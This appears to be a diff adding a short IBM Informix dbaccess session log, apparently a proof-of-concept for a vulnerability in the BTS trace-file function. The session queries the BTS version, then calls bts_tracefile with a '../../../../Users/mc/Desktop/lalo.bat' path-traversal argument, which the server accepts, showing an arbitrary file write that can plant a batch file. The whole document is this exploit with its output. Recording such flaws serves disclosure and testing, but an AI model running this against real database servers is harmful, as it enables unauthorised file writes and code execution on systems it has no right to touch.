@@ -1,0 +1,22 @@
+C:\Program Files (x86)\IBM Informix Software Bundle\bin>dbaccess.exe - -
+> database sysmaster;
+
+Database selected.
+
+> execute function bts_release();
+
+
+
+(expression)  BTS 3.11 Compiled on Fri Feb 14 19:39:56 CST 2020
+
+1 row(s) retrieved.
+
+> execute function bts_tracefile('../../../../Users/mc/Desktop/lalo.bat');
+
+
+(expression)
+
+           t
+
+1 row(s) retrieved.
+
